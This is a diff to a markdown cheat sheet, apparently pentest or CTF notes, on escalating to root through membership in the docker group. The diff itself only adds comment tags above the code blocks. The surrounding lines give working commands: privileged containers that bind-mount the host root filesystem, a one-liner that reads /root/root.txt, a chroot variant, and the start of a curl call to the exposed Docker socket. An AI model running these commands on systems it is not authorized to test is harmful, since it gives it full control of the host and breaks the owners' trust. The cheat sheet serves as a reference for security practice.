@@ -6,6 +6,7 @@ Membership in the `docker` group is equivalent to root on the host, because any 
 
 ## Check Membership
 
+<!-- cmd: linux -->
 ```bash
 id
 groups
@@ -13,12 +14,14 @@ groups <user>          # sometimes you need to check explicitly
 ```
 
 If the group isn't active in the current shell (typical after `su`/reverse shell):
+<!-- cmd: linux -->
 ```bash
 newgrp docker
 ```
 
 ## Exploit — Bind-Mount Host `/`
 
+<!-- cmd: linux -->
 ```bash
 docker run --rm -it --privileged -v /:/hostfs --user root \
   --entrypoint sh privatebin/nginx-fpm-alpine:2.0.2
@@ -33,6 +36,7 @@ Any existing image works — no need to pull a new one if the box has no interne
 
 ## Quick One-Liner (no interactive shell)
 
+<!-- cmd: linux -->
 ```bash
 docker run --rm -i --privileged -v /:/hostfs --user root \
   --entrypoint sh <image> -c "cat /hostfs/root/root.txt"
@@ -40,6 +44,7 @@ docker run --rm -i --privileged -v /:/hostfs --user root \
 
 ## Chroot Variant
 
+<!-- cmd: linux -->
 ```bash
 docker run -v /:/host -it alpine chroot /host /bin/bash
 ```
@@ -47,6 +52,7 @@ docker run -v /:/host -it alpine chroot /host /bin/bash
 ## Docker Socket Exposed but No CLI
 
 If `/var/run/docker.sock` is readable from an unprivileged user but `docker` is not installed:
+<!-- cmd: linux -->
 ```bash
 curl --unix-socket /var/run/docker.sock -X POST \
   -H "Content-Type: application/json" \
